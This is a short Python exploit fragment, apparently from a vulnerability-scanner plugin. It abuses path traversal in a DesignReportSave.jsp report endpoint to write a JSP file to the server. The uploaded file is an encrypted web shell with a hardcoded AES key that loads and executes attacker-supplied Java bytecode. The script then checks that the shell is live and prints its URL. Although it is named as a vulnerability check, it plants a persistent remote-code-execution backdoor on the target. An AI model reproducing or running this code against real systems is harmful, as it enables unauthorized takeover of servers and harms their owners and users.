...
def check_vuln(url):
	...
	vuln_url ='{}://{}/report/DesignReportSave.jsp?report=../apic0fig.jsp'.format(url[0],url[1])
	headers = {
		'User-Agent': get_ua(),
		'Content-Type': 'application/octet-stream'
	}
	data='''qhzkgvst<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'''
	
	try:
		res = requests.post(vuln_url,headers=headers,data=data,timeout=15,verify=False)
		if res.status_code == 200:
			webshell = '{}/apic0fig.jsp'.format(url1)
			shell = requests.get(webshell,allow_redirects=False,timeout=15,verify=False)
			if shell.status_code == 200 and 'qhzkgvst' in shell.text:
				print('\033[32m[+]webshell: {}\033[0m'.format(webshell))
